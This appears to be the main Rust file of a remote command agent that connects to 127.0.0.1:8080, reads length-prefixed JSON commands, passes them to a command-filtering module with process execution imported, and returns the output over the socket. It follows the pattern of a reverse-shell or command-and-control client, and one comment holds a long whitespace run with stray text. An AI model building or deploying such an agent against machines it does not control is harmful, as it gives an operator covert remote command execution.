#![allow(unused_imports)]
#![allow(dead_code)]
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt,AsyncWriteExt};
use tokio::process::Command;
use std::process::Stdio;
use serde_json::Result;
use tokio::{io::*, process::*, sync::*, *};
mod comm;
mod funcs;


#[tokio::main]
async fn main() {

    // Buff for socket
    let mut buff = [0;8];
    // Tokio create connection
    let mut stream: tokio::net::TcpStream =  match TcpStream::connect("127.0.0.1:8080").await {
        Ok(stream) => stream,
        _ => panic!("Failed to connect")
    };
    let (tx, mut rx) = mpsc::channel::<comm::MyProto>(32);

    // Keep accepting data and do stuff with it                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         uff with is
    loop{
        select!{
            n = stream.read(&mut buff) =>{
                let data_len: usize = std::str::from_utf8( &mut buff[..n.unwrap()]).unwrap().parse().unwrap();
                let mut full_buff = vec![0;data_len];
                let n = stream.read(&mut full_buff).await.unwrap();
                let my_data: comm::MyProto = serde_json::from_str(std::str::from_utf8( &mut full_buff[..n]).unwrap()).unwrap();
                funcs::filter_command(my_data, &tx).await;
            }

            message = rx.recv() => {
                funcs::send_output(message.unwrap(), &mut stream).await;
            }
        }           
    }
}